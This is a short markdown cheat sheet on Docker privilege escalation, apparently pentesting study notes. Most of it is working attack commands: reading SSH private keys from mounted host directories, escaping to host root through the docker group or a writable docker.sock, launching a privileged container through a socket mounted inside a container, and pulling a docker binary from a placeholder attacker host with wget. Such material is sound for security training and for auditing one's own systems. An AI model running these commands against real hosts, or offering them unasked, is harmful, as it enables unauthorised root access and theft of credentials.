## Docker Privilege Escalation

Docker uses a client-server architecture: the **Docker client** issues commands, and the **Docker daemon** executes them and manages containers. Misconfigurations in either layer can be abused to escape the container and gain root on the host.

---

### Shared directories

When inside a container, check for non-standard mounted directories — these may expose parts of the host filesystem:

```shell
ls -la /
```

If a user's home directory is mounted, look for SSH keys immediately:

```shell
cat /hostsystem/home/<user>/.ssh/id_rsa
cat /hostsystem/root/.ssh/id_rsa
```

---

### Docker group membership

Being in the `docker` group grants effective control over the daemon — equivalent to root access on the host. Confirm with:

```shell
id
docker image ls
```

Mount the host filesystem into a new container:

```shell
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

---

### Writable Docker socket — `/var/run/docker.sock`

If the default socket is writable, it can be used to issue daemon commands directly:

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

---

### Docker socket exposed inside a container

Sometimes the Docker socket is bind-mounted into the container itself:

```shell
ls -al ~/app/
# srw-rw---- 1 root root 0 ... docker.sock
```

If the `docker` binary isn't available inside the container, transfer it:

```shell
wget https://<attacker>:443/docker -O docker
chmod +x docker
```

Enumerate running containers via the socket:

```shell
docker -H unix:///app/docker.sock ps
```

Launch a new privileged container with the host root filesystem mounted:

```shell
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock ps
```

Drop into the new container using its ID:

```shell
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

The full host filesystem is now accessible under `/hostsystem` with root privileges. Extract the root SSH key to gain persistent access:

```shell
cat /hostsystem/root/.ssh/id_rsa
```

> 💡 A writable `docker.sock` — whether at `/var/run/docker.sock` or mounted inside a container — is functionally equivalent to root on the host. It should be one of the first things checked during container enumeration.
